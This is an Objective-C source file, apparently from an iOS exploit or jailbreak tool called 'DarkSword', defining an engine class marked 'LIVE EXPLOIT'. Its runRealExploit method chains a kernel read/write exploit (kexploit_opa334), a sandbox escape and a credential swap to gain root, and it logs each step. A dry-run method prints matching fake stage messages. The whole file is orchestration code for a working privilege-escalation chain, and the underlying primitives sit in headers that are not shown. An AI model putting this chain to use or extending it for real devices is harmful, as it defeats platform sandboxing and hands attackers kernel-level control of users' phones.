#import "ADSDarkEngine.h"
#import "kexploit_opa334.h"
#import "sandbox_escape.h"
#import "kutils.h"

@implementation ADSDarkEngine

- (NSString *)modeLabel {
    return @"LIVE EXPLOIT";
}

- (NSArray<NSArray<NSString *> *> *)dryRunStages {
    return @[
        @[@"[+] Initializing DarkSword exploit chain..."],
        @[@"offsets: loaded", @"krw: physical OOB ready"],
        @[@"kexploit_opa334: launching physical r/w..."],
        @[@"sandbox_escape: patching extensions..."],
        @[@"uid elevation: launchd ucred swap..."],
        @[@"[+] KERNEL R/W ACHIEVED", @"[+] SANDBOX ESCAPED"]
    ];
}

- (BOOL)runRealExploit {
    NSLog(@"[DarkSword] Starting REAL exploit...");

    int ret = kexploit_opa334();
    if (ret != 0) {
        NSLog(@"[-] kexploit_opa334 failed: %d", ret);
        return NO;
    }

    uint64_t selfProc = proc_self();
    if (selfProc == 0) {
        NSLog(@"[-] Failed to get self proc");
        return NO;
    }

    if (sandbox_escape(selfProc) == 0) {
        NSLog(@"[+] Sandbox escape successful!");
        if (sandbox_elevate_to_root(selfProc) == 0) {
            NSLog(@"[+] ROOT ACHIEVED! uid = %d", getuid());
            return YES;
        }
    }
    return NO;
}

@end
